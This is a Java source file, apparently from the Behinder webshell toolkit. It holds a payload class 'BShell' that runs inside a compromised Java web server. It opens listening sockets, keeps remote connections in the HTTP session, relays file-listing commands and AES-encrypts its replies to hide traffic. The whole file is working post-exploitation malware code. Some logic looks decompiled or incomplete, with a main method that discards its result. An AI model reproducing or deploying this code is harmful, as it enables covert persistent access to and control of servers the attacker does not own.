package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class BShell implements Runnable {
   public static String action;
   public static String target;
   public static String localPort;
   public static String params;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;

   public BShell() {
   }

   public BShell(HttpSession session) {
      this.Session = session;
   }

   public boolean equals(Object obj) {
      PageContext page = (PageContext)obj;
      this.Session = page.getSession();
      this.Response = page.getResponse();
      this.Request = page.getRequest();
      Map result = new HashMap();
      this.Response.setCharacterEncoding("UTF-8");

      try {
         if (action.equals("create")) {
            this.createBShell();
            ((Map)result).put("msg", target + "的BShell创建成功");
            ((Map)result).put("status", "success");
         } else if (action.equals("list")) {
            result = this.listBShell(page);
         } else if (action.equals("close")) {
            result = this.closeBShell(page);
         } else if (action.equals("clear")) {
            result = this.clearBShell(page);
         } else {
            ((Map)result).put("msg", this.doWork());
            ((Map)result).put("status", "success");
         }
      } catch (Exception var6) {
         ((Map)result).put("msg", var6.getMessage());
         ((Map)result).put("status", "fail");
      }

      try {
         ServletOutputStream so = this.Response.getOutputStream();
         so.write(this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
         page.getOut().clear();
      } catch (Exception var5) {
      }

      return true;
   }

   private Map listBShell(PageContext page) throws Exception {
      Map result = new HashMap();
      if (this.Session.getAttribute("BShellList") != null) {
         Map BShellList = (Map)this.Session.getAttribute("BShellList");
         List objArr = new ArrayList();
         Iterator var5 = BShellList.keySet().iterator();

         while(var5.hasNext()) {
            String targetIP = (String)var5.next();
            Socket socket = (Socket)BShellList.get(targetIP);
            Map obj = new HashMap();
            obj.put("target", targetIP);
            obj.put("status", socket.isConnected() + "");
            objArr.add(obj);
         }

         result.put("status", "success");
         result.put("msg", this.buildJsonArray(objArr, true));
      } else {
         result.put("status", "fail");
         result.put("msg", "没有存活的BShell连接");
      }

      return result;
   }

   private Map closeBShell(PageContext page) throws Exception {
      Map result = new HashMap();
      if (this.Session.getAttribute("BShellList") != null) {
         Map BShellList = (Map)this.Session.getAttribute("BShellList");
         if (BShellList.containsKey(target)) {
            Socket socket = (Socket)BShellList.get(target);
            if (socket != null && !socket.isClosed()) {
               socket.close();
            }

            BShellList.remove(target);
            result.put("status", "success");
            result.put("msg", "连接到【" + target + "】的BShell已关闭。");
         } else {
            result.put("status", "fail");
            result.put("msg", "没有找到连接到【" + target + "】的BShell。");
         }
      } else {
         result.put("status", "fail");
         result.put("msg", "没有存活的BShell连接");
      }

      return result;
   }

   private Map clearBShell(PageContext page) throws Exception {
      Map result = new HashMap();
      if (this.Session.getAttribute("BShellList") != null) {
         this.Session.removeAttribute("BShellList");
      }

      result.put("status", "success");
      result.put("msg", "BShell已清空。");
      return result;
   }

   private String buildJsonArray(List list, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      sb.append("[");
      Iterator var4 = list.iterator();

      while(var4.hasNext()) {
         Map entity = (Map)var4.next();
         sb.append(this.buildJson(entity, encode) + ",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("]");
      return sb.toString();
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private void createBShell() {
      (new Thread(new BShell(this.Session))).start();
   }

   public void run() {
      try {
         ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
         serverSocketChannel.socket().bind(new InetSocketAddress(Integer.parseInt(localPort)));
         serverSocketChannel.configureBlocking(false);

         while(true) {
            while(true) {
               SocketChannel socketChannel = serverSocketChannel.accept();
               if (socketChannel != null) {
                  String remoteIP = socketChannel.socket().getInetAddress().getHostAddress();
                  String key = "BShell_" + remoteIP;
                  this.Session.setAttribute(key, socketChannel);
               }
            }
         }
      } catch (IOException var5) {
      }
   }

   private String doWork() throws Exception {
      String key = "BShell_" + target;
      SocketChannel socketChannel = (SocketChannel)this.Session.getAttribute(key);
      if (socketChannel == null) {
         throw new Exception("指定的BShell不存在：" + target);
      } else {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         if (action.equals("listFile")) {
            Map paramsMap = this.str2map(params);
            String path = (String)paramsMap.get("path");
            ByteBuffer writeBuf = ByteBuffer.allocate(path.getBytes().length + 1);
            writeBuf.put((path + "\n").getBytes());
            writeBuf.flip();
            socketChannel.write(writeBuf);
            ByteBuffer readBuf = ByteBuffer.allocate(512);

            for(int bytesRead = socketChannel.read(readBuf); bytesRead > 0; bytesRead = socketChannel.read(readBuf)) {
               baos.write(readBuf.array(), 0, bytesRead);
               if (readBuf.get(bytesRead - 4) == 55 && readBuf.get(bytesRead - 3) == 33 && readBuf.get(bytesRead - 2) == 73 && readBuf.get(bytesRead - 1) == 54) {
                  break;
               }

               readBuf.clear();
            }
         }

         return new String(baos.toByteArray());
      }
   }

   private Map str2map(String params) {
      Map paramsMap = new HashMap();
      String[] var3 = params.split("\n");
      int var4 = var3.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         String line = var3[var5];
         paramsMap.put(line.split("\\^")[0], line.split("\\^")[1]);
      }

      return paramsMap;
   }

   public static void main(String[] args) {
      localPort = "5555";

      try {
         ServerSocket serverSocket = new ServerSocket(Integer.parseInt(localPort), 50);

         while(true) {
            Socket socket = serverSocket.accept();
            String remoteIP = socket.getRemoteSocketAddress().toString();
            (new StringBuilder()).append("BShell_").append(remoteIP).toString();
         }
      } catch (IOException var5) {
      }
   }
}
